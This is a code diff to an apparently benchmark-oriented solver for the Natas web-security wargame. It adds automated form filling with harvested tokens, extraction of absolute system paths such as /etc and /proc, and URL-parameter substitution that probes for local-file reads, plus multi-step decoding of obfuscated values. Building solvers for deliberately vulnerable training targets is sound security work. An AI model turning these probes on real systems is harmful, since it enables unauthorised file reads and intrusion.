@@ -254,7 +254,121 @@ def retry_variants(html: str, origin: str, path: str = "/", headers_text: str = 
     return out[:12]
 
 
-def solve_level(level: int, password: str, fetch, budget: int = 45) -> dict:
+_FORM_RE = re.compile(r"<form\b[^>]*>(.*?)</form>", re.I | re.S)
+_ACTION_RE = re.compile(r"""\baction\s*=\s*["']([^"']*)["']""", re.I)
+_METHOD_RE = re.compile(r"""\bmethod\s*=\s*["']?(get|post)""", re.I)
+_INPUT_RE = re.compile(r"<(?:input|textarea|select)\b[^>]*>", re.I)
+_NAME_RE = re.compile(r"""\bname\s*=\s*["']?([A-Za-z0-9_\-\[\]]+)""", re.I)
+_VALUE_RE = re.compile(r"""\bvalue\s*=\s*["']([^"']*)["']""", re.I)
+_TYPE_RE = re.compile(r"""\btype\s*=\s*["']?([a-z]+)""", re.I)
+
+
+def forms_in(html: str) -> list:
+    """[{action, method, fields}] for every form on the page. Pure, no network.
+
+    Observation gets you to a page; a great many findings need the page ACTED ON. Hidden inputs are
+    carried through unchanged (they are usually state the server expects back), and the interesting
+    fields — the ones a tester varies — are returned separately so a caller can substitute values it
+    discovered elsewhere."""
+    out = []
+    for m in _FORM_RE.finditer(html or ""):
+        block, tag = m.group(1), m.group(0)[:m.group(0).find(">") + 1]
+        fields, interesting = {}, []
+        for inp in _INPUT_RE.finditer(block):
+            raw = inp.group(0)
+            nm = _NAME_RE.search(raw)
+            if not nm:
+                continue
+            name = nm.group(1)
+            typ = (_TYPE_RE.search(raw).group(1).lower() if _TYPE_RE.search(raw) else "text")
+            if typ == "reset":
+                continue
+            val = _VALUE_RE.search(raw)
+            fields[name] = val.group(1) if val else ""
+            # A SUBMIT BUTTON IS PART OF THE PAYLOAD. Server handlers routinely gate on it
+            # (`array_key_exists("submit", $_POST)`, `if isset($_POST['save'])`), so dropping it means
+            # the request is silently rejected no matter how right the other values are — the form was
+            # submitted and nothing happened, which reads as "the value was wrong".
+            # It is carried, never VARIED: it is not an input a tester controls the meaning of.
+            if typ not in ("hidden", "submit", "button", "image"):
+                interesting.append(name)
+        if fields:
+            out.append({"action": (_ACTION_RE.search(tag).group(1) if _ACTION_RE.search(tag) else ""),
+                        "method": (_METHOD_RE.search(tag).group(1).lower()
+                                   if _METHOD_RE.search(tag) else "get"),
+                        "fields": fields, "interesting": interesting})
+    return out
+
+
+def form_submissions(html: str, discovered) -> list:
+    """[(label, form, payload)] — each form filled with a value the scan already DISCOVERED. Pure.
+
+    This is the step that turns observation into interaction, and it is general: a value recovered from
+    one part of a target is exactly what a tester feeds back into a form on another part. Nothing here
+    knows what any particular form is for.
+
+    Every discovered value is tried in every non-hidden field, one field at a time, so a success is
+    attributable to a single substitution rather than a lucky combination."""
+    out = []
+    for form in forms_in(html):
+        # 14, not 6. A decoded value necessarily sits behind the raw tokens it was derived from, so a
+        # tight budget silently excludes exactly the candidates that cost the most to produce — the
+        # decode chain ran, found the answer, and nothing ever submitted it.
+        for value in list(discovered or [])[:14]:
+            for field in form["interesting"][:3]:
+                payload = dict(form["fields"])
+                payload[field] = value
+                out.append(("form %s=%s..." % (field, str(value)[:8]), form, payload))
+    return out[:30]
+
+
+_ABS_PATH_RE = re.compile(r"(/(?:etc|var|opt|home|usr|srv|tmp|proc)/[A-Za-z0-9_\-./]{2,80})")
+
+
+def absolute_paths(text: str) -> list:
+    """Filesystem paths named in content — the target telling you where something lives. Pure.
+
+    A hint, a stack trace, an error page or a config dump routinely names an absolute path. Combined with
+    a parameter that loads files, that is the whole of a local-file-read: the target supplies both the
+    vulnerability and the address. General to any application, not a property of one."""
+    out = []
+    for m in _ABS_PATH_RE.finditer(text or ""):
+        p = m.group(1).rstrip(".,;:)\"'")
+        if p not in out:
+            out.append(p)
+    return out[:12]
+
+
+def param_substitutions(urls, values) -> list:
+    """[(label, url)] — each observed URL parameter replaced with each discovered path. Pure.
+
+    This is the local-file-read probe in its general form: a parameter that names a resource is a
+    parameter that may name ANY resource. One parameter is varied at a time so a success attributes to a
+    single substitution, the same discipline the form prober uses."""
+    from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
+    out = []
+    for u in list(urls or [])[:6]:
+        parts = urlsplit(str(u))
+        qs = parse_qsl(parts.query)
+        if not qs:
+            continue
+        for i, (k, _v) in enumerate(qs):
+            for val in list(values or [])[:6]:
+                new = list(qs)
+                new[i] = (k, val)
+                out.append(("param %s=%s" % (k, str(val)[:34]),
+                            urlunsplit((parts.scheme, parts.netloc, parts.path,
+                                        urlencode(new), parts.fragment))))
+    return out[:24]
+
+
+# Tokens worth feeding back into a form: long-ish opaque strings. A secret read out of a disclosed file
+# looks like this, and so does a session id or a hash. Deliberately wider than PASSWORD_RE, because the
+# value a form wants is often NOT the 32-char answer — it is an intermediate the server checks.
+_INTERESTING_TOKEN_RE = re.compile(r"(?<![A-Za-z0-9])([A-Za-z0-9+/=_\-]{8,64})(?![A-Za-z0-9])")
+
+
+def solve_level(level: int, password: str, fetch, budget: int = 70, post=None) -> dict:
     """Attempt ONE level with general engines. THE single implementation — the /benchmark/natas endpoint
     calls this rather than repeating it, because two copies of a solver drift and then disagree about
     what the benchmark measured.
@@ -303,6 +417,78 @@ def solve_level(level: int, password: str, fetch, budget: int = 45) -> dict:
         fetches += 1
         if s == 200 and b != body:
             pages["%s [%s]" % (base, label)] = b
+
+    # INTERACTION. Everything above is observation; a great many findings need the page acted on. Values
+    # the scan already discovered anywhere are fed back into every form field, one substitution at a
+    # time so a success is attributable. `post` is optional so a caller without it degrades to
+    # observation-only rather than crashing — and the result then says the class went untested.
+    # RANK BY RARITY. A secret appears in ONE place; boilerplate (framework names, nav labels, the level's
+    # own hostname) appears in every page fetched. Taking the first tokens found meant the landing page's
+    # furniture crowded out the value dug out of a disclosed file — the engines had already recovered it
+    # and the harness never tried it. Rarity is a general signal, not a hint about any particular target.
+    freq, first_seen = {}, {}
+    for url, b in pages.items():
+        for tok in set(_INTERESTING_TOKEN_RE.findall(b)):
+            if tok == password:
+                continue
+            freq[tok] = freq.get(tok, 0) + 1
+            first_seen.setdefault(tok, url)
+    # rarest first; among equals prefer what was found by DIGGING (not the landing page)
+    discovered = sorted(freq, key=lambda t: (freq[t], first_seen[t] == base, -len(t)))
+
+    # DECODE what was discovered. An application that stores a check-value obfuscated —
+    # `base64(strrev(bin2hex(x)))` is ordinary — hands over the answer in a form no single decode step
+    # recovers. `intel.decode_chains` walks stacked encodings, so the plaintext joins the candidate pool
+    # ahead of the encoded form it came from.
+    try:
+        import intel as _intel
+        decoded = []
+        for tok in discovered[:8]:
+            for value, recipe in _intel.decode_chains(tok, depth=4):
+                if 6 <= len(value) <= 64 and value not in decoded and value not in freq:
+                    decoded.append(value)
+        # Order matters and a first attempt got it wrong: prepending decoded values pushed the rarest
+        # RAW token out of the candidate budget and broke a level that had been passing. The rarest few
+        # originals keep their place; decoded values slot in behind them.
+        discovered = discovered[:3] + decoded + discovered[3:]
+    except Exception:
+        pass
+    # LOCAL-FILE READ. A parameter that names a resource may name any resource, and targets routinely
+    # disclose absolute paths in hints, errors and config dumps. Both halves come from the target.
+    paths = []
+    for b in pages.values():
+        for p in absolute_paths(b):
+            if p not in paths:
+                paths.append(p)
+    if paths:
+        for label, url in param_substitutions(list(pages), paths):
+            if fetches >= budget:
+                break
+            try:
+                s, b, _ = fetch(url, auth)
+            except Exception:
+                continue
+            fetches += 1
+            if s == 200 and b != body:
+                pages["%s [%s]" % (base, label)] = b
+
+    if post and discovered:
+        for label, form, payload in form_submissions(body, discovered):
+            if fetches >= budget:
+                break
+            action = urljoin(base, form["action"] or "")
+            try:
+                if form["method"] == "post":
+                    s, b, _ = post(action, auth, payload)
+                else:
+                    from urllib.parse import urlencode
+                    sep = "&" if "?" in action else "?"
+                    s, b, _ = fetch(action + sep + urlencode(payload), auth)
+            except Exception:
+                continue
+            fetches += 1
+            if s == 200 and b != body:
+                pages["%s [%s]" % (base, label)] = b
 
     pool = []
     for u, b in pages.items():
